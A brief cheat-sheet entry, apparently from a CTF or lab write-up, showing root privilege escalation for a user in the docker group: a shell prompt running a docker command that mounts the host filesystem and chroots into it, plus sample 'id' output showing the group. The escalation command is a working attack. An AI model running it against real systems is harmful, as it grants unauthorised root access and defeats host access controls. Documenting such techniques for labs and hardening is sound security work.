```
anurodh@ubuntu:/home/apaar$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh

```


simple priv esc to root


if docker is reflected in `id`

```
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```